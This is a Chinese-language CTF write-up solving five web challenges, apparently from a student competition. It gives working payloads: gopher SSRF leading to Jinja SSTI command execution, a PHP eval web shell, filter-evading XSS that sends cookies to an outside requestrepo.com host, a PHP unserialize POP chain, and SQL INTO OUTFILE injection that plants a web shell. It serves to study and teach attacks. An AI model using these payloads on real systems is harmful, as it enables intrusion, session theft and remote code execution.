## where is ssti
可以试一下`http://www.baidu.com`可以访问得到。有ssrf。
再`file:///etc/passwd`也可以读取。
读取`file:///etc/hosts`看网卡ip。是`172.17.0.2`可以看到是处于`172.17.0`网段的网卡。
接下来爆破整个网段。
发现只有`172.17.0.2`是存活的。
端口爆破也只有80端口是开放的。
再根据源码
```python
from flask import Flask, request  
import requests  
  
app = Flask(__name__)  
  
@app.route('/', methods=['GET','POST'])  
  
def handle_request():  
      
    name = request.form.get('name','')  
    data = {"template":name}  
    res = requests.post('http://localhost:5001/',data=data).text  
    return res  
      
if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=5000)
```
要用得到gopher伪协议。
```python
import urllib.parse  
  
test = \  
"""POST / HTTP/1.1  
Host: 127.0.0.1:5001  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 100  
  
template={{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('env').read()}}  
"""  
# 后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A", "%0D%0A")  
result = 'gopher://127.0.0.1:5001/_' + urllib.parse.quote(new)  
print(result)
```
得到payload
```
url=gopher://127.0.0.1:5001/_POST%2520/%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A5001%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%2520100%250D%250A%250D%250Atemplate%253D%257B%257Bconfig.__class__.__init__.__globals__.__builtins__.__import__%2528%2527os%2527%2529.popen%2528%2527env%2527%2529.read%2528%2529%257D%257D%250D%250A
```
就可以执行。
## 武功秘籍
看到了dcrcms，搜一下发现这个东西有文件上传漏洞。
https://blog.csdn.net/weixin_70137901/article/details/134065051
网站为弱密码`admin/admin`
之后操作全同文章了。
这里不知道为什么
```php
<?php 
@eval($_POST[cmd]);
phpinfo();
?>
```
里`POST[cmd]`里的引号有时候可以加，有时候不可以加，可能和php版本有关。这里加上引号就直接乱码了。
## 小 E 的留言板

有XSS漏洞
```
<script>alert(1)</script>
```
中`<>`和`script`都被过滤了。
发现他被拼接在双引号了，那就闭合。
```
" oonnmouseover=alert(1) "
```
可以执行成功，但是他是要窃取回话令牌。还要对方无察觉。
```
" oonnmouseover=fetch(`http://is6u5fuy.requestrepo.com/`+document.cookie) automouseover "
```
这样发送就可以了。
或者
```
" oonnfofocuscus=fetch(`http://is6u5fuy.requestrepo.com/`+document.cookie) autofofocuscus "
```
就可以得到flag。
## 小羊走迷宫
```php
<?php 
include "flag.php"; 
error_reporting(0); 
class startPoint{ 
	public $direction; 
	function __wakeup(){ 
		echo "gogogo出发咯 "; 
		$way = $this->direction; 
		return $way(); //5，把对象当函数调用，触发__invoke
} } 
class Treasure{ 
	protected $door; 
	protected $chest; 
	function __get($arg){ 
		echo "拿到钥匙咯，开门！ "; 
		$this -> door -> open(); //2.open是不存在的方法，触发__call，但要触发__get
	} 
	function __toString(){ 
		echo "小羊真可爱! "; 
		return $this -> chest -> key; //3.key是不可访问属性，触发__get，但要触发__toString
	} } 
class SaySomething{ 
	public $sth; 
	function __invoke() { 
		echo "说点什么呢 "; 
		return "说： ".$this->sth; //4,当字符串调用，触发__tostring，
	} } 
class endPoint{ 
	private $path; 
	function __call($arg1,$arg2){ 
		echo "到达终点！现在尝试获取flag吧"."<br>"; 
		echo file_get_contents($this->path); //1，要file_get_contents('flag.php')就要先__call，(调用一个不存在的方法)
		} } 
if ($_GET["ma_ze.path"]){ 
	unserialize(base64_decode($_GET["ma_ze.path"])); //6，触发__wakeup
	}
else{ 
	echo "这个变量名有点奇怪，要怎么传参呢？"; } ?>
```
首先梳理pop链，逆推
```php
<?php
class startPoint{
    public $direction;
}
class Treasure{
    public $door;
    public $chest;//改为public可以直接调用
}
class SaySomething{
    public $sth;
}
class endPoint{
    private $path = 'flag.php';
}
$start = new startPoint();
$say = new SaySomething();
$end = new endPoint();
$t1 = new Treasure();
$t2 = new Treasure();
$t1->chest = $t2;
$t2->door = $end;
$start->direction = $say;
$say->sth = $t1;
echo base64_encode(serialize($start));
?>
```
最终payload
```
?ma[ze.path=TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NDoiZG9vciI7TjtzOjU6ImNoZXN0IjtPOjg6IlRyZWFzdXJlIjoyOntzOjQ6ImRvb3IiO086ODoiZW5kUG9pbnQiOjE6e3M6MTQ6IgBlbmRQb2ludABwYXRoIjtzOjg6ImZsYWcucGhwIjt9czo1OiJjaGVzdCI7Tjt9fX19
```
## sqlupload
根据源码getfilelist.php有
```php
$order = $_GET['order'] ?? "upload_time";
    if (!preg_match("/upload_time|id/", $order)) {
        json_error("非法的 order 参数", 400);
    }
    $sql = "SELECT id, filename, upload_time
            FROM uploads
            ORDER BY $order";
    $result = $mysqli->query($sql);
```
和getfilecontent.php
```php
$id = isset($_GET['id']) ? (int) $_GET['id'] : 0;
if ($id <= 0) {
    html_error(400, '缺少或非法的 id 参数');
}
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
try {
    $mysqli = new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);
    $mysqli->set_charset('utf8mb4');
    $res = $mysqli->query("SELECT filename, content FROM uploads WHERE id = $id LIMIT 1");
    $mysqli->close();
```
如果传入
```
/getFileList.php?order=id+into+outfile+'/var/www/html/shell.php'
```
拼接一下，原语句就成了
```
SELECT id, filename, upload_time 
FROM uploads 
ORDER BY id INTO OUTFILE '/var/www/html/shell.php'
```
可以传入成功，访问可以得到`1 666.txt 2026-01-27 07:57:58 2 666 (2).php 2026-01-27 07:58:30`
也就是
```
编号 文件名 时间
```
所以可以在文件名处写入木马。
因为windows文件名里不可以有特殊符号，所以要抓包修改文件名为`<?php @eval($_POST['cmd']);phpinfo();?>.php`再`/getFileList.php?order=id+into+outfile+'/var/www/html/shell3.php'`
再访问`/shell3.php`但是`/flag`是空的。有一个`readflag`
cat一下是ELF开头的，是一个linux的可执行文件，相当于windows的exe和dll。
```
cmd=system('/readFlag');
```
可以直接得到flag。







